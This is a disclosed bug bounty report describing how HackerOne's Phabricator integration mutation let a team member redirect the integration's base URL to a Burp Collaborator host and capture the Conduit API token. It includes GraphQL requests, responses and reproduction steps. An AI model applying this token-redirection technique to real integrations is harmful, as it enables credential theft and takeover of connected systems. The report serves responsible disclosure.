# Improper data update process on UpdatePhabricatorIntegration mutation leads to leak of Phabricator Conduit API token.

## Report Details
- **Report ID**: 1161141
- **URL**: https://hackerone.com/reports/1161141
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-04-12T06:03:10.811Z
- **Disclosed**: 2021-04-30T05:54:40.703Z

## Reporter
- **Username**: nukedx
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
## Details
**Title**: Improper data update process on `UpdatePhabricatorIntegration` mutation leads to leak of Phabricator Conduit API token.
**Risk**: High
**Impact**: High
**Exploitability**: High
**Target**: `base_url` parameter on `UpdatePhabricatorIntegration` mutation at `/graphql` endpoint.

## Introduction
Sensitive data exposure occurs when an application, company, or other entity inadvertently exposes personal data. Sensitive data exposure differs from a data breach, in which an attacker accesses and steals information.

## Synopsis
**Phabricator Conduit API** is using simple verification system and requires a valid api token for system bots, integrations etc to get full access to the **Phabricator** instances.

**HackerOne** is allowing their program users to add various integrations for their programs, such as **Phabricator**.  When user with enough permissions adds connection details for the **Phabricator** system stores this information and enables settings options.

Settings for **Phabricator** integration are fetched through GraphQL via using `PhabricatorLayoutQuery` operation, when executed users are fetching similar result as below (see F1262314):
```json
{
  "data": {
    "team": {
      "id": "Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTI1NzQ=",
      "phabricator_integration": {
        "id": "Z2lkOi8vaGFja2Vyb25lL1BoYWJyaWNhdG9ySW50ZWdyYXRpb24vNDA1",
        "__typename": "PhabricatorIntegration",
        "base_url": "https://skima.is/",
        "title": "{{title}}",
        "description": "{{details_markdown}}",
        "process_phabricator_status_change": true,
        "process_phabricator_comment_added": true,
        "process_h1_status_change": true,
        "process_h1_comment_added": true
      },
      "__typename": "Team",
      "handle": "test-phab-api-leak",
      "custom_field_attributes": {
        "total_count": 0,
        "edges": [],
        "__typename": "CustomFieldAttributeConnection"
      }
    }
  }
}
```

As we can see from the results, there is no API token information is revealed due to security measures, when we manipulate request and try to fetch API token with `api_token` field which was field used on initial integration add process, GraphQL returns following error (see F1262318):
```json
{
  "errors": [
    {
      "message": "Field 'api_token' doesn't exist on type 'PhabricatorIntegration'",
      "locations": [
        {
          "line": 29,
          "column": 5
        }
      ],
      "path": [
        "fragment PhabricatorDisconnectForm",
        "phabricator_integration",
        "api_token"
      ],
      "extensions": {
        "code": "undefinedField",
        "typeName": "PhabricatorIntegration",
        "fieldName": "api_token"
      }
    }
  ]
}
```

On **Phabricator** integration UI users can only change bi-directional commenting, updates and report escalation settings (see F1262320). When any change is done, `UpdatePhabricatorIntegration` mutation is executed on GraphQL as following (see F1262329):
```json
{
  "operationName": "UpdatePhabricatorIntegration",
  "variables": {
    "team_id": "Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTIzNjI=",
    "title": "{{title}}",
    "description": "{{details_truncated}}",
    "process_h1_comment_added": true,
    "process_h1_status_change": true,
    "process_phabricator_comment_added": true,
    "process_phabricator_status_change": true
  },
  "query": "mutation UpdatePhabricatorIntegration($team_id: ID!, $base_url: String, $api_token: String, $title: String, $description: String, $process_h1_comment_added: Boolean, $process_h1_status_change: Boolean, $process_phabricator_comment_added: Boolean, $process_phabricator_status_change: Boolean) {\n  updatePhabricatorIntegration(input: {team_id: $team_id, base_url: $base_url, api_token: $api_token, title: $title, description: $description, process_h1_comment_added: $process_h1_comment_added, process_h1_status_change: $process_h1_status_change, process_phabricator_comment_added: $process_phabricator_comment_added, process_phabricator_status_change: $process_phabricator_status_change}) {\n    was_successful\n    errors(first: 100) {\n      edges {\n        node {\n          id\n          type\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    team {\n      id\n      phabricator_integration {\n        id\n        base_url\n        title\n        description\n        process_phabricator_status_change\n        process_phabricator_comment_added\n        process_h1_status_change\n        process_h1_comment_added\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"
}
```
As we can see this is actually similar to initial integration create process, let's see what happens if we try to change `base_url` field and GraphQL replies as following (see F1262334):
```json
{
  "data": {
    "updatePhabricatorIntegration": {
      "was_successful": true,
      "errors": {
        "edges": [],
        "__typename": "ErrorConnection"
      },
      "team": {
        "id": "Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTIzNjI=",
        "phabricator_integration": {
          "id": "Z2lkOi8vaGFja2Vyb25lL1BoYWJyaWNhdG9ySW50ZWdyYXRpb24vNDA4",
          "base_url": "https://bixp32pnbkbisrmuxgsrrzn8lzrufj.burpcollaborator.net",
          "title": "{{title}}",
          "description": "{{details_truncated}}",
          "process_phabricator_status_change": true,
          "process_phabricator_comment_added": true,
          "process_h1_status_change": true,
          "process_h1_comment_added": true,
          "__typename": "PhabricatorIntegration"
        },
        "__typename": "Team"
      },
      "__typename": "UpdatePhabricatorIntegrationPayload"
    }
  }
}
```

It looks like we are able to update `base_url` and HackerOne just does DNS query to check if target host is active and not controlling if user trying to update existing connection, it's also possible to change `api_token`too but we do not need it.

Now let's try to see if we are able to leak token in system, all we need to do is finding active report on system, since there is also no active escalation control on `/reports/<reportid>/escalate_to_phabricator` endpoint unlike `/reports/<reportid>/escalate_to_jira` (see F1262353). We can try to escalate to our Burp Collaborator.

Firstly we will view a triage report and escalate it to the valid **Phabricator** (see F1262348), after that we will change `base_url` to our Burp Collaborator (see F1262349).

Now everything is ready to go just send escalate to **Phabricator** request again without deleting old one (see F1262350) and check if our collaborator got hit.

When we check our burp collaborator, we will see that api token is leaked (see F1262342), now we can restore base url and restore **Phabricator** settings.

## Root cause of the issue
**HackerOne** is using `UpdatePhabricatorIntegration` mutation for both creating and updating **Phabricator** integration however, do not verify that existence of connection.

They are checking if there is active connection and showing settings on UI for according to it, meanwhile not verifying existence of connection is allowing update of the URL for integration.

While team member can use any none triaged report to escalating issue to **Phabricator**, they can also abuse improper escalation check on `/reports/<reportid>/escalate_to_phabricator` endpoint and leak the API token.

## Steps to reproduce
1. Enable Burp Suite or any proxy for tracking and intercepting request done.
2. Create a new team on https://hackerone.com/teams/new/sandbox or use existing team you are member of.
3. Go to **Phabricator** integration located on https://hackerone.com/team_handle/phabricator_integration
4. Set up your **Phabricator** integration
5. Triage a report and escalate it to **Phabricator** integration.
6. Update **Phabricator** integration and intercept the request, add following to the GraphQL query: `"base_url":"https://yourcollab"` and send the request.
7. Send escalate to the **Phabricator** request again for the report, notice that you will get **500** error or create new report and escalate it.
8. Check your collaborator server and notice that token is leaked.

## Impact

A malicious team member with enough rights for controlling **Phabricator** integration settings can alternate existing connections URL and leak api token for it by escalating report then revert setting.

Since not all team members might have administrator rights on **Phabricator** instance, they can gain access to the Conduit API which is having all permission on the system which could lead to complete compromising of it.

## Attachments
- fetched.png
- error.png
- phab-settings.png
- update.png
- changed.png
- token-leaked.png
- initial-escalate.png
- updated2.png
- second-escalate.png
- jira-escalate.png
